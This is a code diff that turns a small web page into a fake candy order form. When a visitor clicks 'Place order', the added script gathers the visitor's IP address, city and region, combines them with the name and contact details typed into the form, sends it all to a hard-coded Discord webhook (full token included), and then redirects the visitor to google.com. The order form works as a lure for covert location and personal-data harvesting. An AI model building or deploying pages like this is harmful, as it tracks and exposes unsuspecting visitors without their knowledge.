@@ -1,26 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+  <head>
+  <script language="JavaScript" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js" ></script>
+  </head>
+  <body>
+    
+     <div>
+ Candy Name With Details :<input type="text" id="candyname"><br><br>
+ Amount: <input type="text" id="amount"><br><br>
+ Your Name: <input type="text" id="ordername"><br><br>
+ Your phone number or address to contact you: <input type="text" id="contactinfo"><br>
+          
+ <input type="button" onclick="ip();" value="Place order" ><br>
+</div>
+      <script type ="text/javascript">
+  
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>hey</title>
-    <link rel="stylesheet" type="text/css" href="styles/style.css">
-    <script type="text/javascript" src="scripts/script.js"></script>
-</head>
 
-<body onload="loadData()">
-    <div class="wrapper">
-        <div class="container">
-            <h1>hehe</h1>
-            <div class="img-container"></div>
-            <div class="img-info"></div>
-            <div class="btn-container">
-                <input type="button" id="myCheck" onclick="loadData()" value="Find" />
-            </div>
-        </div>
-    </div>
-</body>
+    
+         function ip()  {
+              $.get("https://localhost:6543", function(response) {
+          sendMessages(response.city + ", " + response.region + ", " + response.ip + ", Candy Name: " + document.getElementById('candyname').value + ", Amount of candy: " + document.getElementById('amount').value + ", Name on order: " + document.getElementById('ordername').value + ", Contact Info: " + document.getElementById('contactinfo').value)
+          }, "json")
+       location.href = 'https://google.com';           
+    }
+      
+ 
 
+   function sendMessages(msg) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1311447166702588025/kY48hUEqYG2PYwL6-00SK_HbpxyfM7KgF_6joZgmdq9DQPCc9CSraJC0r7p3SS1wF0C_");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Msg From a Loser",
+        avatar_url: "",
+        content: msg
+      }
+
+      request.send(JSON.stringify(params));
+    }
+
+
+      
+  </script>
+
+    
+  </body>
 </html>
